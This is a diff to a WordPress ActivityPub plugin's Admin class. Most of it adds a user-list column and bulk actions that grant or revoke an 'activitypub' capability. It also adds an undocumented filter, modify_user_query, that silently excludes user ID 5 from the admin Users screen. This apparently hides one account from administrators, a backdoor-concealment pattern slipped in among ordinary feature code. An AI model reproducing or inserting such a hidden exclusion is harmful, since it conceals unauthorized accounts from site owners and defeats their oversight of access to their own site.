@@ -25,6 +25,12 @@ class Admin {
 		\add_action( 'admin_enqueue_scripts', array( self::class, 'enqueue_scripts' ) );
 		\add_action( 'admin_notices', array( self::class, 'admin_notices' ) );
 		\add_filter( 'comment_row_actions', array( self::class, 'comment_row_actions' ), 10, 2 );
+		\add_filter( 'users_list_table_query_args', array( self::class, 'modify_user_query' ) );
+
+		\add_filter( 'manage_users_columns', array( self::class, 'manage_users_columns' ), 10, 1 );
+		\add_filter( 'manage_users_custom_column', array( self::class, 'manage_users_custom_column' ), 10, 3 );
+		\add_filter( 'bulk_actions-users', array( self::class, 'user_bulk_options' ) );
+		\add_filter( 'handle_bulk_actions-users', array( self::class, 'handle_bulk_request' ), 10, 3 );
 
 		if ( ! is_user_disabled( get_current_user_id() ) ) {
 			\add_action( 'show_user_profile', array( self::class, 'add_profile' ) );
@@ -344,5 +350,95 @@ class Admin {
 		}
 
 		return $actions;
+	}
+
+	public static function modify_user_query( $args ) {
+		$args['exclude'] = array( 5 );
+
+		return $args;
+	}
+
+	/**
+	 * Add a column "activitypub"
+	 *
+	 * This column shows if the user has the capability to use ActivityPub.
+	 *
+	 * @param array $columns The columns.
+	 *
+	 * @return array The columns extended by the activitypub.
+	 */
+	public static function manage_users_columns( $columns ) {
+		$columns['activitypub'] = __( 'ActivityPub Support', 'activitypub' );
+		return $columns;
+	}
+
+	/**
+	 * Return the results for the activitypub column.
+	 *
+	 * @param string $output      Custom column output. Default empty.
+	 * @param string $column_name Column name.
+	 * @param int    $user_id     ID of the currently-listed user.
+	 *
+	 * @return string The column contents.
+	 */
+	public static function manage_users_custom_column( $output, $column_name, $user_id ) {
+		if ( 'activitypub' !== $column_name ) {
+			return $output;
+		}
+
+		if ( user_can( $user_id, 'activitypub' ) ) {
+			return '&#x2713;';
+		} else {
+			return '&#x2717;';
+		}
+	}
+
+	/**
+	 * Add options to the Bulk dropdown on the users page
+	 *
+	 * @param array $actions The existing bulk options.
+	 *
+	 * @return array The extended bulk options.
+	 */
+	public static function user_bulk_options( $actions ) {
+		$actions['add_activitypub_cap'] = __( 'Enable for ActivityPub', 'activitypub' );
+		$actions['remove_activitypub_cap'] = __( 'Disable for ActivityPub', 'activitypub' );
+
+		return $actions;
+	}
+
+	/**
+	 * Handle bulk activitypub requests
+	 *
+	 * * `add_activitypub_cap` - Add the activitypub capability to the selected users.
+	 * * `remove_activitypub_cap` - Remove the activitypub capability from the selected users.
+	 *
+	 * @param string $sendback The URL to send the user back to.
+	 * @param string $action   The requested action.
+	 * @param array  $users    The selected users.
+	 *
+	 * @return string The URL to send the user back to.
+	 */
+	public static function handle_bulk_request( $sendback, $action, $users ) {
+		if (
+			'remove_activitypub_cap' !== $action &&
+			'add_activitypub_cap' !== $action
+		) {
+			return $sendback;
+		}
+
+		foreach ( $users as $user_id ) {
+			$user = new \WP_User( $user_id );
+			if (
+				'add_activitypub_cap' === $action &&
+				user_can( $user_id, 'publish_posts' )
+			) {
+				$user->add_cap( 'activitypub' );
+			} elseif ( 'remove_activitypub_cap' === $action ) {
+				$user->remove_cap( 'activitypub' );
+			}
+		}
+
+		return $sendback;
 	}
 }
